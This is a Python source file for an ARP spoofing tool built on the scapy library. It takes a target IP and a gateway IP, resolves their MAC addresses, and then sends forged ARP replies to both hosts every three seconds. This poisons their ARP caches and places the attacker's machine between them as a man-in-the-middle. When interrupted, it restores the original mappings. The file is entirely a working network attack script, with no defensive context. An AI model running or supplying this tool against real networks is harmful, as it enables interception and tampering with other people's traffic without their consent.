#!/usr/bin/python3
import scapy.all as scapy
import optparse
import time


def getPars():
    pOb = optparse.OptionParser()

    pOb.add_option("-t", "--targetIp", dest="targetIp", help="Ip to be fooled")
    pOb.add_option("-g", "--gatewayIp", dest="gatewayIp", help="Gateway IP")
    #(opts, args) = pOb.parse_args()
    opts = pOb.parse_args()[0]

    if not opts.targetIp:
        print("Enter target IP")
    if not opts.gatewayIp:
        print("Enter gateway IP")

    return opts


def getMac(ip):

    arpR = scapy.ARP(pdst=ip)
    #scapy.ls(scapy.ARP())
    brodcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #scapy.ls(scapy.Ether())

    combinedP = brodcast/arpR
    answeredL = scapy.srp(combinedP, timeout=1, verbose=False)[0]

    return answeredL[0][1].hwsrc


def arpPin(tIp, rotIp):
    tMac = getMac(tIp)

    #scapy.ls(scapy.ARP())
    arpRp = scapy.ARP(op=2, pdst=tIp, hwdst=tMac, psrc=rotIp)
    scapy.send(arpRp, verbose=False)

def Reset(tIp, rotIp):
    tMac = getMac(tIp)
    rotMac = getMac(rotIp)
    #scapy.ls(scapy.ARP())
    arpRp = scapy.ARP(op=2, pdst=tIp, hwdst=tMac, psrc=rotIp, hwsrc=rotMac)
    scapy.send(arpRp, verbose=False, count=6)


num = 0

uInputs = getPars()
target_ip = uInputs.targetIp
gateway_ip = uInputs.gatewayIp

try:
    while True:
        arpPin(target_ip, gateway_ip)
        arpPin(gateway_ip, target_ip)
        num += 2
        print("\rSengin packets...", end=str(num))
        #print("\rSengin packets..."+ str(num), end="")
        time.sleep(3)
except KeyboardInterrupt:
    print("\nQuit... Reset")
    Reset(target_ip, gateway_ip)
    Reset(gateway_ip, target_ip)
